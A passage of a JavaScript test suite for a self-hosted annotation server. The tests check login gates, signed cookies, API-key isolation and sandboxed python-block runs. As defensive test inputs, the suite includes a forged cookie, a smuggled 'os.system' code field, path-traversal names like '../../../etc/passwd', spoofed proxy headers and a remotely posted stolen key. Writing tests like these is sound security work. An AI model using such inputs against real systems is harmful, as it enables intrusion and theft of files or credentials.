      // signed in, and still refused: the gate lets them past and this door does not
      assert.equal((await POST(hb, '/review-comments', body,
        { ...REMOTE, authorization: `Bearer ${PW}`, 'x-plugin-handle': 'ada' })).status, 403,
      'a guest with the password');
      assert.equal((await POST(hb, '/review-comments', body, { ...ADA, cookie: adaCookie })).status, 403,
        'a signed-in guest');
      // …and anything unauthenticated never reaches it at all
      for (const [what, headers] of [
        ['the tunnel, with nothing typed', { host: 'discuss.botference.com', 'cf-ray': 'abc-LHR' }],
        ['a plain remote request', REMOTE],
      ]) {
        assert.equal((await POST(hb, '/review-comments', body, headers)).status, 401, what);
      }
      const local = await POST(hb, '/review-comments', body, { host: '127.0.0.1' });
      assert.equal(local.status, 200, 'and from this machine it is the ordinary projection');
    });

    // The PDF import names its own authors too — "adril" is a /T field in
    // somebody's file, not anybody who signed in — so it is the owner's door
    // and nobody else's.
    await test('importing a PDF’s own comments is the owner’s, and only the owner’s', async () => {
      const body = { url: 'bfp-pdf://text/' + 'd'.repeat(64),
        annots: [{ id: 'abcdef0123456789', page: 1, author: 'angadh', quote: 'x', text: 'me, honest' }] };
      assert.equal((await POST(hb, '/pdf-annotations', body, { ...ADA, cookie: adaCookie })).status, 403,
        'a signed-in guest');
      assert.equal((await POST(hb, '/pdf-annotations', body,
        { ...REMOTE, authorization: `Bearer ${PW}`, 'x-plugin-handle': 'ada' })).status, 403,
      'a guest with the password');
      assert.equal((await POST(hb, '/pdf-annotations', body, REMOTE)).status, 401,
        'and nothing unauthenticated reaches it at all');
    });

    // --- the signed name: a guest is the name in their own cookie ---------
    await test('a signed-in guest cannot rename themselves to another guest', async () => {
      const r = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: 'and who am I?' },
        { ...REMOTE, cookie: adaCookie, 'x-plugin-handle': 'bob' });
      assert.equal(r.status, 200);
      assert.equal(r.json.msg.author, 'ada-l', 'the signed name wins over the claimed one');
      const me = await GET(hb, '/whoami', { ...REMOTE, cookie: adaCookie, 'x-plugin-handle': 'bob' });
      assert.equal(me.json.handle, 'ada-l');
    });

    await test('a cookie with the handle swapped out is worth nothing', async () => {
      const [exp, role, , sig] = adaCookie.match(/plugin_auth=([^;]*)/)[1].split('.');
      const forged = `plugin_auth=${exp}.${role}.bob.${sig}`;
      const r = await GET(hb, '/whoami', { ...REMOTE, cookie: forged });
      assert.equal(r.status, 401, 'the name is under the signature — moving it breaks it');
    });

    await test('a session in use renews itself, so the phone never meets the gate twice', async () => {
      const fresh = await FORM(hb, '/auth', { handle: 'renewed', password: PW, next: '/pages' }, REMOTE);
      const jar = cookieJar(fresh);
      const young = await GET(hb, '/pages', { ...REMOTE, cookie: jar, accept: 'text/html' });
      assert.equal(young.headers['set-cookie'], undefined, 'a young session is left alone');
      // hand-age it past half its life by re-signing a nearer expiry
      const half = Date.now() + 24 * 3600 * 1000; // well inside the 30-day TTL
      const s = fs.readFileSync(path.join(hostDir, '.auth-secret'), 'utf8').trim();
      const body = `${half}.guest.renewed`;
      const aged = `plugin_auth=${body}.${crypto.createHmac('sha256', s).update(body).digest('hex')}`;
      const old = await GET(hb, '/pages', { ...REMOTE, cookie: aged, accept: 'text/html' });
      assert.equal(old.status, 200);
      const reissued = (old.headers['set-cookie'] || []).join('; ');
      assert.match(reissued, /plugin_auth=\d+\.guest\.renewed\./, 'it is handed back extended');
      assert.ok(Number(reissued.match(/plugin_auth=(\d+)\./)[1]) > half, 'and further out than it was');
    });

    await test('sign out clears the session', async () => {
      const r = await GET(hb, '/signout', { ...REMOTE, cookie: adaCookie });
      assert.equal(r.status, 303);
      assert.equal(r.headers.location, '/pages');
      assert.match((r.headers['set-cookie'] || []).join('; '), /plugin_auth=; Max-Age=0/);
    });

    await test('the reading room renders the quotes and messages for an authed guest', async () => {
      const list = await GET(hb, '/pages', { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.match(list.body, new RegExp(`href="/p/${key}"`));
      assert.ok(list.body.includes(TITLE1));
      const p = await GET(hb, `/p/${key}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.equal(p.status, 200);
      assert.match(p.headers['content-type'], /text\/html/);
      assert.ok(p.body.includes(QUOTE1), 'the highlighted passage, as a blockquote');
      assert.ok(p.body.includes('The whole argument.'), 'the owner\'s comment');
      assert.ok(p.body.includes('Agreed — and the return leg? (fixed)'), 'the guest\'s reply');
      assert.ok(p.body.includes('MOCK claude reply.'), 'and what the bots said');
      assert.ok(p.body.includes(`<a href="${PAGE1}"`), 'the title links out to the article');
      assert.match(p.body, new RegExp(`value="${ownerThread.id}"`), 'a reply composer bound to the thread');
      assert.match(p.body, /value="__page__"/, 'and one for the page chat');
      assert.equal((p.body.match(/action="\/reply"/g) || []).length, 2, 'one composer per thread + page chat');
      assert.ok(!p.body.includes('<script src'), 'no build step, no external script');
      const missing = await GET(hb, `/p/${'0'.repeat(40)}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.equal(missing.status, 404);
    });

    // The drawer's commenter pills, as the only thing a scriptless view can be:
    // a rail of links. A margin narrowed to one person is therefore something a
    // reader can send somebody.
    await test('the reading room filters the margin by commenter, with a link', async () => {
      const read = q => GET(hb, `/p/${key}${q}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' })
        .then(r => r.body);
      const all = await read('');
      assert.match(all, /class="rail by"/, 'a rail, because more than one person has written here');
      assert.match(all, new RegExp(`href="/p/${key}\\?by=ada"`), 'one link per commenter');
      assert.match(all, new RegExp(`href="/p/${key}"[^>]*class="on"`), 'All is the one you are on');

      const mine = await read('?by=ada');
      assert.ok(mine.includes('Agreed — and the return leg? (fixed)'), 'her thread is here');
      assert.match(mine, new RegExp(`href="/p/${key}\\?by=ada"[^>]*class="on"`), 'and her pill says so');
      assert.ok(all.length >= mine.length, 'a filtered margin is never the bigger one');

      const nobody = await read('?by=nobody-at-all');
      assert.ok(nobody.includes('Nothing from nobody-at-all on this page'),
        'a filter that matches nothing says so, rather than "nothing highlighted yet"');
      assert.match(nobody, new RegExp(`<a href="/p/${key}">show everyone</a>`), '…and offers the way back');
    });

    await test('a composer post from the reading room appends and redirects back', async () => {
      const r = await FORM(hb, '/reply', {
        url: PAGE1, thread_id: ownerThread.id, text: 'Posted from the web view.', redirect: `/p/${key}`,
      }, { ...REMOTE, cookie: adaCookie });
      assert.equal(r.status, 303);
      assert.equal(r.headers.location, `/p/${key}#${ownerThread.id}`);
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      const last = page.threads[0].msgs.at(-1);
      assert.equal(last.text, 'Posted from the web view.');
      assert.equal(last.author, 'ada-l', 'the cookie names the author');
      const refused = await FORM(hb, '/reply', {
        url: PAGE1, thread_id: '__page__', text: '@claude from the web view', redirect: `/p/${key}`,
      }, { ...REMOTE, cookie: adaCookie });
      assert.equal(refused.status, 303);
      assert.match(refused.headers.location,
        /^\/p\/[0-9a-f]{40}\?notice=the%20owner%20hasn/, 'the refusal rides back as a notice');
    });

    // The reading room is the phone, and the phone is where a reader actually
    // catches up on a page. It gets the same two states — one folded line at
    // the foot of the list, with what each thread settled — out of <details>
    // and a form post, because this view has no script and is not getting one.
    await test('the reading room resolves, folds the archive away, and shows what was settled', async () => {
      const before = await GET(hb, `/p/${key}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.ok(!before.body.includes('Resolved ('), 'nothing folded away while nothing is resolved');
      assert.match(before.body, /action="\/resolve"/, 'but every thread offers the button');

      const r = await FORM(hb, '/resolve', {
        url: PAGE1, thread_id: ownerThread.id, resolved: '1', redirect: `/p/${key}`,
      }, { ...REMOTE, cookie: adaCookie });
      assert.equal(r.status, 303, 'a form post redirects, it does not answer JSON');

      const after = await GET(hb, `/p/${key}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.match(after.body, /<details class="resolved-sec"><summary>Resolved \(1\)/,
        'one collapsed section at the foot of the list');
      assert.match(after.body, /class="card resolved"/, 'the card says what it is');
      assert.match(after.body, /class="digest"/, 'and leads with what the thread settled');
      assert.ok(after.body.includes(QUOTE1), 'the highlight is still shown — resolving never hides a passage');
      assert.match(after.body, /↺ reopen/, 'and the way back is right there');

      // an empty `resolved` field is how the reopen button says "off": a form
      // has no booleans, and "" must not read as truthy
      const back = await FORM(hb, '/resolve', {
        url: PAGE1, thread_id: ownerThread.id, resolved: '', redirect: `/p/${key}`,
      }, { ...REMOTE, cookie: adaCookie });
      assert.equal(back.status, 303);
      const reopened = await GET(hb, `/p/${key}`, { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.ok(!reopened.body.includes('Resolved ('), 'back in the main list');
    });

    h.proc.kill();
  }

  // --- one owner identity, shared with the review docs --------------------
  // No PLUGIN_OWNER_PASSWORD here, which is how it really runs: the owner
  // credential comes from the review hub's own files (identity.mjs).
  {
    const idRoot = tmpRoot('identity');
    const idDir = path.join(idRoot, '.botference', 'plugin');
    fs.mkdirSync(idDir, { recursive: true });
    fs.writeFileSync(path.join(idDir, 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    const idSecrets = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-idsec-'));
    // a review hub that has approved devices before writes exactly this file
    const DEVICE_SECRET = crypto.randomBytes(24).toString('hex');
    fs.writeFileSync(path.join(idSecrets, '.review-hub-device-secret'), DEVICE_SECRET, { mode: 0o600 });
    const g = await startServer({
      root: idRoot,
      args: ['--hosted', '--no-agents'],
      env: { PLUGIN_PASSWORD: 'guest-pw', BOTFERENCE_SECRETS_DIR: idSecrets },
    });
    const gb = g.base;
    const REMOTE2 = { host: 'discuss.botference.com' };
    await POST(gb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });

    await test('the owner password is the review hub\'s own, generated where every paper reads it', async () => {
      const file = path.join(idSecrets, 'review-paper-secrets.json');
      const shared = JSON.parse(fs.readFileSync(file, 'utf8'));
      assert.ok(shared.owner && String(shared.owner).length >= 16,
        'one owner password, in the file hub.mjs hands to every paper as REVIEW_OWNER_PASSWORD');
      assert.equal(fs.statSync(file).mode & 0o777, 0o600);
      const r = await FORM(gb, '/auth', { handle: 'whoever', password: shared.owner, next: '/pages' }, REMOTE2);
      assert.equal(r.status, 303);
      const jar = cookieJar(r);
      assert.match(jar, /plugin_auth=\d+\.owner\.angadh\./);
      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: jar });
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' });
      assert.equal((await POST(gb, '/export', { url: PAGE1 }, { ...REMOTE2, cookie: jar })).status, 200,
        'and the owner-only routes open to it, from the phone');
    });

    await test('a browser the review hub already approved is the owner, with nothing typed', async () => {
      const mint = (exp, id, key = DEVICE_SECRET) =>
        `${exp}.${id}.${crypto.createHmac('sha256', key).update(`${exp}.${id}`).digest('hex')}`;
      const id = 'a1b2c3d4e5f6';
      const good = `hub_device=${mint(String(Date.now() + 1e6), id)}`;
      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: good });
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' },
        'a phone approved for review.botference.com is the owner at discuss.botference.com too');
      assert.equal((await POST(gb, '/verbosity', { level: 'short' }, { ...REMOTE2, cookie: good })).status, 200);
      // …and only genuinely signed, unexpired ones
      const wrongKey = `hub_device=${mint(String(Date.now() + 1e6), id, 'f'.repeat(48))}`;
      assert.equal((await GET(gb, '/whoami', { ...REMOTE2, cookie: wrongKey })).status, 401);
      const expired = `hub_device=${mint(String(Date.now() - 1000), id)}`;
      assert.equal((await GET(gb, '/whoami', { ...REMOTE2, cookie: expired })).status, 401);
    });

    await test('the guest password is still just a guest', async () => {
      const r = await FORM(gb, '/auth', { handle: 'ada', password: 'guest-pw', next: '/pages' }, REMOTE2);
      assert.equal(r.status, 303);
      const jar = cookieJar(r);
      assert.match(jar, /plugin_auth=\d+\.guest\.ada\./);
      const me = await GET(gb, '/whoami', { ...REMOTE2, cookie: jar });
      assert.equal(me.json.owner, false);
      assert.equal((await POST(gb, '/export', { url: PAGE1 }, { ...REMOTE2, cookie: jar })).status, 403);
    });

    // The rename moved the address, not the auth. Nothing in hosted.mjs looks
    // at WHICH public hostname a request arrived on — isLocalDirect only asks
    // whether it was localhost — and the hub's device cookie is scoped to the
    // parent domain, so it reaches every subdomain. Both doors, same rights.
    await test('the address before the rename is the same companion, with the same rights', async () => {
      const LEGACY = { host: 'plugin.botference.com' };
      const mint = (exp, id) =>
        `${exp}.${id}.${crypto.createHmac('sha256', DEVICE_SECRET).update(`${exp}.${id}`).digest('hex')}`;
      const dev = `hub_device=${mint(String(Date.now() + 1e6), 'a1b2c3d4e5f6')}`;
      const me = await GET(gb, '/whoami', { ...LEGACY, cookie: dev });
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' },
        'an approved device is the owner on the old hostname too');
      assert.equal((await GET(gb, '/whoami', LEGACY)).status, 401,
        'and the old door is still a door, not a way around the gate');
      const jar = cookieJar(await FORM(gb, '/auth',
        { handle: 'ada', password: 'guest-pw', next: '/pages' }, LEGACY));
      assert.match(jar, /plugin_auth=\d+\.guest\.ada\./);
      assert.ok(!/Domain=/i.test(jar),
        'sessions are host-only, so signing in on one hostname does not leak to the other');
    });

    // memorizer.botference.com is a SECOND DOOR onto this same process, exactly
    // as plugin.botference.com is: one more ingress rule in the tunnel, and
    // nothing in hosted.mjs looking at hostnames. What changes on that host is
    // only WHAT IS SERVED — `/` is the quiz — and what does not change is the
    // gate in front of it.
    await test('the vault\'s own hostname is a door, not a way around the gate', async () => {
      const MEMORIZER = { host: 'memorizer.botference.com' };
      const bare = await GET(gb, '/', { ...MEMORIZER, accept: 'text/html' });
      assert.equal(bare.status, 401, 'the quiz at / is as shut as the reading room');
      assert.match(bare.body, /<form method="POST" action="\/auth">/, 'and answers with the gate');
      const mint = (exp, id) =>
        `${exp}.${id}.${crypto.createHmac('sha256', DEVICE_SECRET).update(`${exp}.${id}`).digest('hex')}`;
      const dev = `hub_device=${mint(String(Date.now() + 1e6), 'a1b2c3d4e5f6')}`;
      const owner = await GET(gb, '/', { ...MEMORIZER, cookie: dev, accept: 'text/html' });
      assert.equal(owner.status, 200);
      assert.match(owner.body, /<title>Memorizer — botference<\/title>/,
        'an approved phone is the owner here too — the hub cookie is scoped to the parent domain');
      // …and a GUEST is still only a guest: the vault is owner-only wherever
      // it is served from
      const jar = cookieJar(await FORM(gb, '/auth',
        { handle: 'ada', password: 'guest-pw', next: '/' }, MEMORIZER));
      const guest = await GET(gb, '/', { ...MEMORIZER, cookie: jar, accept: 'text/html' });
      assert.equal(guest.status, 403, 'signing in is not being the owner');
      // the reading room is not served from this address at all
      const room = await GET(gb, '/pages', { ...MEMORIZER, cookie: dev, accept: 'text/html' });
      assert.equal(room.status, 302);
      assert.equal(room.headers.location, '/');
    });

    await test('localhost is still the owner here, with no cookie and no password', async () => {
      const me = await GET(gb, '/whoami');
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' });
      // and the proxy-header hardening still decides it, not the socket
      const viaTunnel = await GET(gb, '/whoami', { host: 'localhost', 'cf-connecting-ip': '203.0.113.9' });
      assert.equal(viaTunnel.status, 401);
    });

    g.proc.kill();
  }

  // --- API keys: written from this machine, never read back ---------------
  {
    const kRoot = tmpRoot('keys');
    const kDir = path.join(kRoot, '.botference', 'plugin');
    fs.mkdirSync(kDir, { recursive: true });
    fs.writeFileSync(path.join(kDir, 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    const kSecrets = fs.mkdtempSync(path.join(os.tmpdir(), 'bfp-keysec-'));
    const envDump = path.join(kRoot, 'bridge-env.jsonl');
    const kLog = path.join(kRoot, 'bridge-log.jsonl');
    const k = await startServer({
      root: kRoot,
      env: {
        BOTFERENCE_SECRETS_DIR: kSecrets,
        PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
        MOCK_BRIDGE_LOG: kLog, MOCK_ENV_DUMP: envDump, MOCK_TURN_DELAY_MS: '40',
        PLUGIN_SID_WAIT_MS: '400',
        // an ambient key AND an ambient sibling auth source, as a shell that
        // exported them would leave behind
        ANTHROPIC_API_KEY: 'ambient-should-never-be-used',
        ANTHROPIC_AUTH_TOKEN: 'ambient-token-should-never-be-used',
        CLAUDE_CODE_USE_BEDROCK: '1',
      },
    });
    const kb = k.base;
    const KEYFILE = path.join(kSecrets, 'discuss-keys.json');
    const CLAUDE_KEY = 'sk-ant-test-0123456789';
    const CODEX_KEY = 'sk-openai-test-9876543210';
    // Spawn a bridge and report the environment it was handed. Leaves the
    // bridge IDLE on the way out: a key change only restarts a bridge that is
    // not mid-turn, so a test that returned while one was running would leave
    // the next one asserting against the previous spawn's environment.
    const settle = () => waitFor(
      async () => (await GET(kb, '/health')).json.queue === 0, 'the bridge to go idle');
    const bridgeEnv = async (text) => {
      fs.writeFileSync(envDump, '');
      await POST(kb, '/page', { url: PAGE2, title: 'Keys', site: 'k.test' });
      await POST(kb, '/reply', { url: PAGE2, thread_id: '__page__', text });
      const line = await waitFor(
        () => (fs.existsSync(envDump) && fs.readFileSync(envDump, 'utf8').trim().split('\n')[0]) || null,
        'the bridge to be spawned and dump its env');
      await settle();
      return JSON.parse(line);
    };

    await test('a fresh companion holds no keys and says so without inventing one', async () => {
      const r = await GET(kb, '/keys');
      assert.deepEqual(r.json, {
        ok: true, claude: 'unset', codex: 'unset',
        modes: { claude: 'auto', codex: 'auto' },
      });
      assert.equal(fs.existsSync(KEYFILE), false, 'and writes no file until there is something to keep');
    });

    await test('auto with no key spawns the bridge with the variable ABSENT', async () => {
      const env = await bridgeEnv('@claude first turn, no keys anywhere');
      assert.deepEqual(env.present, [],
        'no key and no OTHER auth source reaches the CLIs — the ambient ones are stripped, '
        + 'because the mode is the answer, not whatever was lying around in a shell. '
        + 'An ANTHROPIC_AUTH_TOKEN left behind would override the subscription just as a key would');
      assert.equal('ANTHROPIC_API_KEY' in env.values, false);
    });

    await test('a key is stored 0600 and can never be read back', async () => {
      const r = await POST(kb, '/keys', { agent: 'claude', key: CLAUDE_KEY });
      assert.equal(r.status, 200);
      assert.equal(r.json.claude, 'set');
      assert.equal(r.json.codex, 'unset');
      assert.equal(JSON.stringify(r.json).includes(CLAUDE_KEY), false,
        'the answer says "set", never the key');
      const got = await GET(kb, '/keys');
      assert.deepEqual(got.json, {
        ok: true, claude: 'set', codex: 'unset',
        modes: { claude: 'auto', codex: 'auto' },
      });
      assert.equal(fs.statSync(KEYFILE).mode & 0o777, 0o600);
      assert.ok(fs.readFileSync(KEYFILE, 'utf8').includes(CLAUDE_KEY), 'it really was kept');
      // and it is nowhere it could leak
      const models = await GET(kb, '/models');
      assert.equal(JSON.stringify(models.json).includes(CLAUDE_KEY), false);
      assert.deepEqual(models.json.keys.modes, { claude: 'auto', codex: 'auto' });
      assert.equal(models.json.keys.claude, 'set');
    });

    await test('auto with a key hands exactly that key to the CLI that reads it', async () => {
      await POST(kb, '/keys', { agent: 'codex', key: CODEX_KEY });
      const env = await bridgeEnv('@claude now with keys stored');
      assert.deepEqual(env.present.sort(), ['ANTHROPIC_API_KEY', 'OPENAI_API_KEY'],
        'the two keys, and nothing else that could answer the same question');
      assert.equal(env.values.ANTHROPIC_API_KEY, CLAUDE_KEY, 'claude reads ANTHROPIC_API_KEY');
      assert.equal(env.values.OPENAI_API_KEY, CODEX_KEY, 'codex reads OPENAI_API_KEY');
    });

    await test('subscription mode keeps the key but never lets it into the env', async () => {
      const r = await POST(kb, '/key-mode', { agent: 'claude', mode: 'subscription' });
      assert.equal(r.status, 200);
      assert.equal(r.json.claude, 'set', 'the key is still stored — this is a preference, not a delete');
      assert.equal(r.json.modes.claude, 'subscription');
      const env = await bridgeEnv('@claude on the subscription now');
      assert.deepEqual(env.present, ['OPENAI_API_KEY'], 'only the agent that still wants a key gets one');
      assert.equal('ANTHROPIC_API_KEY' in env.values, false,
        'absent, not empty: an empty key is a different thing to a CLI than no key');
      assert.ok(fs.readFileSync(KEYFILE, 'utf8').includes(CLAUDE_KEY), 'and the key survived the round trip');
    });

    await test('removing a key is a real delete, and auto goes straight back to the subscription', async () => {
      await POST(kb, '/key-mode', { agent: 'claude', mode: 'auto' });
      const r = await POST(kb, '/keys/remove', { agent: 'claude' });
      assert.equal(r.status, 200);
      assert.equal(r.json.removed, true);
      assert.equal(r.json.claude, 'unset');
      assert.equal(fs.readFileSync(KEYFILE, 'utf8').includes(CLAUDE_KEY), false,
        'gone from the file, not merely overwritten with a blank');
      const env = await bridgeEnv('@claude back on the subscription for good');
      assert.deepEqual(env.present, ['OPENAI_API_KEY']);
      assert.equal('ANTHROPIC_API_KEY' in env.values, false, 'absent, not empty');
      const again = await POST(kb, '/keys/remove', { agent: 'claude' });
      assert.equal(again.json.removed, false, 'removing nothing is fine, and says so');
    });

    await test('a key mode of "key" with nothing stored falls back rather than sending a blank', async () => {
      await POST(kb, '/key-mode', { agent: 'claude', mode: 'key' });
      const env = await bridgeEnv('@claude asked for a key it does not have');
      assert.equal('ANTHROPIC_API_KEY' in env.values, false);
      await POST(kb, '/key-mode', { agent: 'claude', mode: 'auto' });
    });

    await test('nonsense is refused before it reaches the file', async () => {
      assert.equal((await POST(kb, '/keys', { agent: 'gemini', key: 'x' })).status, 400);
      assert.equal((await POST(kb, '/keys', { agent: 'claude', key: '   ' })).status, 400);
      assert.equal((await POST(kb, '/key-mode', { agent: 'claude', mode: 'whenever' })).status, 400);
      const still = await GET(kb, '/keys');
      assert.equal(still.json.claude, 'unset');
    });

    await test('a key never crosses the tunnel, not even for the owner', async () => {
      // every shape of remote request, including one that IS the owner
      const proxied = [
        { host: 'discuss.botference.com' },
        { host: 'discuss.botference.com', 'cf-connecting-ip': '203.0.113.9' },
        { host: 'localhost', 'cf-connecting-ip': '203.0.113.9' },
        { host: 'localhost', 'x-forwarded-for': '203.0.113.9' },
      ];
      for (const h of proxied) {
        const w = await POST(kb, '/keys', { agent: 'codex', key: 'sk-stolen' }, h);
        assert.equal(w.status, 403, JSON.stringify(h));
        assert.deepEqual(w.json, { ok: false, error: 'API keys can only be set from this machine' });
        assert.equal((await GET(kb, '/keys', h)).status, 403, 'not even the status');
        assert.equal((await POST(kb, '/keys/remove', { agent: 'codex' }, h)).status, 403);
        assert.equal((await POST(kb, '/key-mode', { agent: 'codex', mode: 'key' }, h)).status, 403);
      }
      const untouched = await GET(kb, '/keys');
      assert.equal(untouched.json.codex, 'set', 'and nothing a remote caller sent was applied');
      assert.equal(fs.readFileSync(KEYFILE, 'utf8').includes('sk-stolen'), false);
    });

    await test('the bridge log never contains a key', async () => {
      assert.equal(fs.readFileSync(kLog, 'utf8').includes(CODEX_KEY), false);
      assert.equal(fs.readFileSync(kLog, 'utf8').includes(CLAUDE_KEY), false);
      assert.equal(k.out().includes(CODEX_KEY), false, 'nor does anything the companion printed');
    });

    k.proc.kill();
  }

  // --- running a ```python block ------------------------------------------
  // The whole feature is "this runs on your Mac as you", so the tests are
  // mostly about the things that must NOT happen: code arriving on the wire,
  // a guest reaching it, output growing without bound, a run that will not
  // stop, and files surviving the message that owned them.
  {
    const havePython = (() => {
      try {
        const r = spawnSync('python3', ['-c', 'pass'], { stdio: 'ignore' });
        return !r.error && r.status === 0;
      } catch { return false; }
    })();
    if (!havePython) {
      console.log('\n  ####  SKIPPING every /run test: no python3 on PATH  ####');
      console.log('  ####  install python3 (or put it on PATH) and run this file again  ####\n');
    }
    // matplotlib is not a dependency of this repo and the figure path does not
    // need one: a snippet that writes its own png exercises the harvest just as
    // well. Where matplotlib IS installed, the plt.show() wrapper is checked too.
    const haveMpl = havePython && (() => {
      try {
        const r = spawnSync('python3', ['-c', 'import matplotlib'], { stdio: 'ignore' });
        return !r.error && r.status === 0;
      } catch { return false; }
    })();
    const runTest = (name, fn) => (havePython ? test(name, fn) : Promise.resolve());

    const runRoot = tmpRoot('run');
    const runPlugin = path.join(runRoot, '.botference', 'plugin');
    // a short timeout, so "a runaway loop is killed" costs two seconds
    const r0 = await startServer({ root: runRoot, args: ['--no-agents'], env: { PLUGIN_RUN_TIMEOUT_MS: '2000' } });
    const rb = r0.base;
    const RKEY = crypto.createHash('sha1').update(PAGE1).digest('hex');
    const runDirOf = id => path.join(runPlugin, 'runs', RKEY, id);
    // a message with the block in it, and the address that names it back
    async function seed(text) {
      const t = (await POST(rb, '/thread', {
        url: PAGE1, quote: `q-${Math.random()}`, prefix: '', suffix: '', msg: { text },
      })).json.thread;
      return { thread_id: t.id, ts: t.msgs[0].ts, url: PAGE1 };
    }
    const py = code => '```python\n' + code + '\n```';
    const readMsg = async at => {
      const page = (await GET(rb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      const thread = page.threads.find(t => t.id === at.thread_id);
      return thread.msgs.find(m => m.ts === at.ts);
    };

    await POST(rb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });

    await test('the companion says whether a block may be run at all', async () => {
      const r = await GET(rb, '/run');
      assert.equal(r.status, 200);
      assert.equal(r.json.enabled, true);
      assert.equal(r.json.timeout_ms, 2000);
    });

    await runTest('a python block runs and what it printed lands on the message', async () => {
      const at = await seed('Try this:\n\n' + py('print("hello from the block")'));
      const r = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.equal(r.status, 200);
      assert.equal(r.json.run.status, 'ok');
      assert.equal(r.json.run.exit, 0);
      assert.equal(r.json.run.stdout, 'hello from the block\n');
      assert.match(r.json.run.python, /^3\./, 'the interpreter that actually ran it');
      const msg = await readMsg(at);
      assert.equal(msg.kind, undefined, 'still an ordinary message');
      assert.equal(msg.runs['0'].stdout, 'hello from the block\n', 'and the result survives a refetch');
      assert.ok(fs.existsSync(runDirOf(msg.runs['0'].run_id)), 'with a directory of its own');
    });

    await runTest('stderr and a non-zero exit come back as themselves', async () => {
      const at = await seed(py('import sys\nsys.stderr.write("that went wrong\\n")\nsys.exit(3)'));
      const r = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.equal(r.json.run.status, 'error');
      assert.equal(r.json.run.exit, 3);
      assert.match(r.json.run.stderr, /that went wrong/);
    });

    await runTest('the block that runs is the one the index names — and the code is the STORED code', async () => {
      const at = await seed([
        'first, some javascript:', '```js', 'console.log("never")', '```',
        'then two python blocks:', py('print("block one")'), py('print("block two")'),
      ].join('\n'));
      const second = await POST(rb, '/run', { ...at, block_index: 2 });
      assert.equal(second.json.run.stdout, 'block two\n');
      assert.equal(second.json.block_index, 2);
      // a request that carries code of its own is a request that carries
      // nothing: the companion reads the message, never the body
      const smuggled = await POST(rb, '/run', {
        ...at, block_index: 1,
        code: 'import os; os.system("echo pwned")', text: 'print("pwned")', snippet: 'print("pwned")',
      });
      assert.equal(smuggled.json.run.stdout, 'block one\n');
      assert.ok(!/pwned/.test(smuggled.json.run.stdout + smuggled.json.run.stderr));
      // the javascript block is numbered like everything else, and refused
      const js = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.equal(js.status, 400);
      assert.match(js.json.error, /not python/);
      const missing = await POST(rb, '/run', { ...at, block_index: 9 });
      assert.equal(missing.status, 400);
      assert.match(missing.json.error, /no code block #9/);
    });

    await runTest('a figure is captured, stored beside the run, and served only through the gate', async () => {
      // a 1×1 png the snippet writes itself — the harvest is what is under
      // test, not matplotlib (which this repo does not depend on)
      const at = await seed(py([
        'import base64',
        'png = base64.b64decode(b"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")',
        'open("plot.png", "wb").write(png)',
        'print("drew one")',
      ].join('\n')));
      const r = await POST(rb, '/run', { ...at, block_index: 0 });
      assert.deepEqual(r.json.run.figures, ['plot.png']);
      const id = r.json.run.run_id;
      assert.ok(fs.existsSync(path.join(runDirOf(id), 'plot.png')));

      const raw = await GET(rb, `/run-figure?key=${RKEY}&run=${id}&name=plot.png`);
      assert.equal(raw.status, 200);
      assert.equal(raw.headers['content-type'], 'image/png');
      const json = await GET(rb, `/run-figure?url=${encodeURIComponent(PAGE1)}&run=${id}&name=plot.png&as=json`);
      assert.match(json.json.data_url, /^data:image\/png;base64,iVBOR/, 'the extension gets a data: url');
      // the address is validated into a shape that cannot leave the directory
      for (const bad of ['../../../etc/passwd', 'plot.png/../../x', 'snippet.py']) {
        const r2 = await GET(rb, `/run-figure?key=${RKEY}&run=${id}&name=${encodeURIComponent(bad)}`);
        assert.equal(r2.status, 400, bad);
      }
      assert.equal((await GET(rb, `/run-figure?key=${RKEY}&run=r-zzzz-aaaaaa&name=plot.png`)).status, 404);
    });

    if (haveMpl) {
      await runTest('plt.show() saves the figure instead of trying to open a window', async () => {
        const at = await seed(py([
          'import matplotlib.pyplot as plt',
          'plt.plot([1, 2, 3], [2, 1, 3])',
          'plt.show()',
        ].join('\n')));
        const r = await POST(rb, '/run', { ...at, block_index: 0 });
        assert.equal(r.json.run.status, 'ok');
        assert.ok(r.json.run.figures.length >= 1, 'a figure came out of a show()');
      });
    }

    await runTest('a re-run REPLACES the result and the directory under it', async () => {
      const at = await seed(py('import random\nprint(random.random())'));
      const first = (await POST(rb, '/run', { ...at, block_index: 0 })).json.run;
      const second = (await POST(rb, '/run', { ...at, block_index: 0 })).json.run;
      assert.notEqual(first.run_id, second.run_id);
      assert.equal(fs.existsSync(runDirOf(first.run_id)), false, 'the old run is gone from disk');
      assert.ok(fs.existsSync(runDirOf(second.run_id)));
      const msg = await readMsg(at);
      assert.equal(Object.keys(msg.runs).length, 1, 'one result per block, always');
      assert.equal(msg.runs['0'].run_id, second.run_id);
